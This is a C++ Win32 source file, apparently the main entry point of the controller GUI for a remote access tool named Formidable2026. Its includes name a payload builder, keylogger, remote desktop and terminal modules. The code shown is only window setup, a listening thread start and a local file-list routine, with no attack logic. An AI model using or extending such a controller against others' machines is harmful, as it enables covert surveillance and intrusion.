#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <windows.h>
#include <commctrl.h>
#include <ws2tcpip.h>
#include <shellapi.h>
#include <shlobj.h>
#include <commdlg.h>
#include <vector>
#include <string>
#include <thread>
#include <mutex>
#include <map>
#include <memory>
#include <sstream>
#include <ctime>
#include <algorithm>
#include <functional>
#include <fstream>
#include "resource.h"
#include "../Common/ClientTypes.h"
#include "../Common/Config.h"
#include "../Common/Utils.h"
#include "../Common/NetworkServer.h"

// 模块化头文件
#include "GlobalState.h"
#include "Config.h"
#include "StringUtils.h"
#include "MainWindow.h"
#include "NetworkHelper.h"
#include "UI/BuilderDialog.h"
#include "UI/WindowDialog.h"
#include "UI/ServiceDialog.h"
#include "UI/SettingsDialog.h"
#include "UI/AudioDialog.h"
#include "UI/VideoDialog.h"
#include "UI/KeylogDialog.h"

// 模块化功能
#include "Core/ClientManager.h"
#include "UI/ProcessDialog.h"
#include "UI/TerminalDialog.h"
#include "UI/DesktopDialog.h"
#include "UI/FileDialog.h"
#include "UI/RegistryDialog.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "comdlg32.lib")
#pragma comment(lib, "version.lib")
#pragma comment(lib, "advapi32.lib")

#include <gdiplus.h>
#pragma comment(lib, "gdiplus.lib")

// 使用Formidable命名空间
using namespace Formidable;

/**
 * Formidable2026 - Master GUI Bootstrapper
 * Encoding: UTF-8 BOM
 */

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    g_hInstance = hInstance;
    
    // 初始化 GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    LoadSettings();
    
    g_hInstanceMutex = CreateMutexW(NULL, TRUE, L"Formidable2026_Master_Instance");
    if (g_hInstanceMutex && GetLastError() == ERROR_ALREADY_EXISTS) {
        HWND hExisting = FindWindowW(L"FormidableMasterGUI", NULL);
        if (hExisting) {
            ShowWindow(hExisting, SW_RESTORE);
            SetForegroundWindow(hExisting);
        } else {
            MessageBoxW(NULL, L"程序已经在运行中", L"提示", MB_OK | MB_ICONINFORMATION);
        }
        Gdiplus::GdiplusShutdown(gdiplusToken); // 注意清理
        CloseHandle(g_hInstanceMutex);
        g_hInstanceMutex = NULL;
        return 0;
    }

    INITCOMMONCONTROLSEX icex;
    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_LISTVIEW_CLASSES | ICC_BAR_CLASSES | ICC_TAB_CLASSES;
    InitCommonControlsEx(&icex);

    WNDCLASSEXW wcex = { 0 };
    wcex.cbSize = sizeof(WNDCLASSEX);
    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = WndProc;
    wcex.hInstance = hInstance;
    wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
    wcex.lpszClassName = L"FormidableMasterGUI";
    wcex.hIcon = LoadIconW(hInstance, MAKEINTRESOURCEW(IDI_MAIN));
    RegisterClassExW(&wcex);

    g_hMainWnd = CreateWindowExW(0, L"FormidableMasterGUI", L"Formidable 2026 - Professional Edition", 
        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 1100, 800, NULL, NULL, hInstance, NULL);
    
    if (!g_hMainWnd) return 0;

    ShowWindow(g_hMainWnd, nCmdShow);
    UpdateWindow(g_hMainWnd);
    AddTrayIcon(g_hMainWnd);

    // 启动网络和心跳线程
    std::thread(NetworkThread).detach();
    std::thread(HeartbeatThread).detach();

    AddLog(L"系统", L"主程序启动，监听端口: " + std::to_wstring(g_Settings.listenPort));
    UpdateStatusBar();

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    if (g_hInstanceMutex) CloseHandle(g_hInstanceMutex);
    Gdiplus::GdiplusShutdown(gdiplusToken);
    return (int)msg.wParam;
}


// ============================================================================
// 模块化迁移说明：
// - WinMain: 应用程序入口点，负责初始化和主循环。
// - WndProc: 主窗口过程，已移至 MainWindow.cpp
// - NetworkThread: 网络监听线程，已移至 NetworkHelper.cpp
// - 对话框过程 (DlgProc): 已移至 Dialogs/ 和 UI/ 目录下的对应模块。
// - 全局状态: 定义在 GlobalState.h / GlobalState.cpp
// ============================================================================

 void RefreshLocalFileList(HWND hDlg, HWND hList, const std::wstring& path) {
    ListView_DeleteAllItems(hList);
    int i = 0;
    
    // Add ".." if not root
    if (path.length() > 3) {
        LVITEMW lvi = { 0 };
        lvi.mask = LVIF_TEXT | LVIF_PARAM | LVIF_IMAGE;
        lvi.iItem = i++;
        lvi.pszText = (LPWSTR)L"..";
        lvi.lParam = 1; // Dir
        lvi.iImage = 1; // Folder icon
        ListView_InsertItem(hList, &lvi);
    }

    std::wstring searchPath = path;
    if (searchPath.back() != L'\\') searchPath += L"\\";
    searchPath += L"*";

    WIN32_FIND_DATAW ffd;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &ffd);
    if (hFind != INVALID_HANDLE_VALUE) {
        SendMessage(hList, WM_SETREDRAW, FALSE, 0);
        do {
            if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) continue;

            bool isDir = (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY);
            
            LVITEMW lvi = { 0 };
            lvi.mask = LVIF_TEXT | LVIF_PARAM | LVIF_IMAGE;
            lvi.iItem = i++;
            lvi.pszText = ffd.cFileName;
            lvi.lParam = isDir ? 1 : 0;
            lvi.iImage = isDir ? 1 : 2; // Folder or File icon
            int idx = ListView_InsertItem(hList, &lvi);


            if (!isDir) {
                ULARGE_INTEGER fileSize;
                fileSize.LowPart = ffd.nFileSizeLow;
                fileSize.HighPart = ffd.nFileSizeHigh;
                wchar_t szSize[64];
                if (fileSize.QuadPart < 1024) swprintf_s(szSize, L"%llu B", fileSize.QuadPart);
                else if (fileSize.QuadPart < 1024 * 1024) swprintf_s(szSize, L"%.2f KB", fileSize.QuadPart / 1024.0);
                else if (fileSize.QuadPart < 1024 * 1024 * 1024) swprintf_s(szSize, L"%.2f MB", fileSize.QuadPart / (1024.0 * 1024.0));
                else swprintf_s(szSize, L"%.2f GB", fileSize.QuadPart / (1024.0 * 1024.0 * 1024.0));
                ListView_SetItemText(hList, idx, 1, szSize);
            } else {
                ListView_SetItemText(hList, idx, 1, (LPWSTR)L"<DIR>");
            }

            SYSTEMTIME st;
            FileTimeToSystemTime(&ffd.ftLastWriteTime, &st);
            wchar_t szTime[64];
            swprintf_s(szTime, L"%04d-%02d-%02d %02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);
            ListView_SetItemText(hList, idx, 2, szTime);

        } while (FindNextFileW(hFind, &ffd) != 0);
        FindClose(hFind);
        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
    }
}


